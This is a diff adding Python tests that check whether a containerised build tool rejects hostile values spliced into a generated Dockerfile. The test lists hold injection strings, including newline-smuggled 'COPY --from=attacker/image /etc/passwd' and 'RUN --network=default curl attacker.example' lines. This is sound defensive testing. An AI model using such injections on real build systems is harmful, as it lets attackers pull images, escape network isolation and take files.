@@ -410,3 +410,104 @@ class TestRunEnvAndAuxBuilds:
                 containerized_build(
                     self._repo(tmp_path), "make", out_dir=tmp_path / "out",
                     aux_builds={"../etc": {}})
+
+
+class TestDockerfileValueValidation:
+    """The generated Dockerfile is assembled from values that cross a
+    trust boundary (detector/LLM-synthesised build commands, on-disk
+    spec toolchains). A newline in any of them injects instructions —
+    ``COPY --from=attacker/image`` (host-side image pull) or BuildKit
+    ``RUN --network=default`` (restores the egress ``network="none"``
+    denies) — so every such value is refused as a structured
+    ``rejected_input`` failure before any container work starts."""
+
+    def _repo(self, tmp_path):
+        repo = tmp_path / "repo"
+        repo.mkdir(exist_ok=True)  # helper is re-entered per hostile case
+        (repo / "Makefile").write_text("all:\n\tcc -o app main.c\n")
+        (repo / "main.c").write_text("int main(void){return 0;}\n")
+        return repo
+
+    def _build(self, tmp_path, **kw):
+        patches, fake_build = _fake_container_layer()
+        with patches[0], patches[1], patches[2], patches[3]:
+            product = containerized_build(
+                self._repo(tmp_path), kw.pop("command", "make"),
+                out_dir=tmp_path / "out", **kw)
+        return product, fake_build
+
+    def test_golden_dockerfile_unchanged_for_legit_inputs(self, tmp_path):
+        """Byte-compare the full generated Dockerfile for a multi-word
+        command + toolchain + run_env + aux stage: validation must not
+        alter the text the container layer receives."""
+        from core.env.build import DEFAULT_BUILD_IMAGE
+        patches, fake_build = _fake_container_layer()
+        with patches[0], patches[1], patches[2], patches[3]:
+            containerized_build(
+                self._repo(tmp_path), "make -j2 all",
+                out_dir=tmp_path / "out",
+                toolchain=HARDENED_TOOLCHAIN,
+                run_env={"AFL_USE_ASAN": "1"},
+                aux_builds={"src-cmplog": {"AFL_LLVM_CMPLOG": "1"}})
+        build_id = fake_build.kwargs["labels"]["raptor-env-build.id"]
+        cflags = "-fstack-protector-strong -fPIE -D_FORTIFY_SOURCE=2 -O1"
+        ldflags = "-Wl,-z,relro,-z,now -pie"
+        flag_prefix = (
+            f"CFLAGS='{cflags}' CXXFLAGS='{cflags}' LDFLAGS='{ldflags}' "
+        )
+        assert fake_build.dockerfile == (
+            f"FROM {DEFAULT_BUILD_IMAGE}\n"
+            f"LABEL raptor-env-build.id={build_id}\n"
+            f"COPY src /src\n"
+            f"COPY src /src-cmplog\n"
+            f"WORKDIR /src\n"
+            f"RUN AFL_USE_ASAN='1' {flag_prefix}make -j2 all\n"
+            f"WORKDIR /src-cmplog\n"
+            f"RUN AFL_LLVM_CMPLOG='1' {flag_prefix}make -j2 all\n"
+        )
+
+    def test_hostile_commands_rejected_structured(self, tmp_path):
+        hostile = [
+            # new-instruction injection: attacker image pull at build
+            "make\nCOPY --from=attacker/image /etc/passwd /loot",
+            # BuildKit egress restore on an injected step
+            "make\nRUN --network=default curl attacker.example",
+            "make\r\nRUN --network=default curl attacker.example",
+            # RUN-flag escape (no env/flag prefix precedes the command)
+            "--network=default make",
+            # line continuation absorbs the next generated instruction
+            "make \\",
+            "make\x00",
+        ]
+        for command in hostile:
+            product, fake_build = self._build(tmp_path, command=command)
+            assert not product.ok, command
+            assert product.reason == "rejected_input", command
+            # refused BEFORE any container work
+            assert not hasattr(fake_build, "dockerfile"), command
+
+    def test_hostile_toolchain_rejected_structured(self, tmp_path):
+        hostile = [
+            ToolchainSpec(cc="gcc'\nCOPY --from=evil / /"),
+            ToolchainSpec(cxx="g++' ; curl evil ; '"),
+            ToolchainSpec(cflags=("-O2'\nRUN --network=default x",)),
+            ToolchainSpec(ldflags=("-Wl,-z,now -pie' x '",)),  # space
+        ]
+        for tc in hostile:
+            product, fake_build = self._build(tmp_path, toolchain=tc)
+            assert not product.ok
+            assert product.reason == "rejected_input"
+            assert not hasattr(fake_build, "dockerfile")
+
+    def test_hostile_base_image_rejected_structured(self, tmp_path):
+        product, fake_build = self._build(
+            tmp_path,
+            base_image="gcc:13\nCOPY --from=attacker/image / /loot")
+        assert not product.ok
+        assert product.reason == "rejected_input"
+        assert not hasattr(fake_build, "dockerfile")
+
+    def test_module_toolchain_constants_pass_validation(self):
+        from core.env.build import AFL_TOOLCHAIN
+        for tc in (HARDENED_TOOLCHAIN, SOFT_TOOLCHAIN, AFL_TOOLCHAIN):
+            assert _flag_prefix(tc)  # must not raise
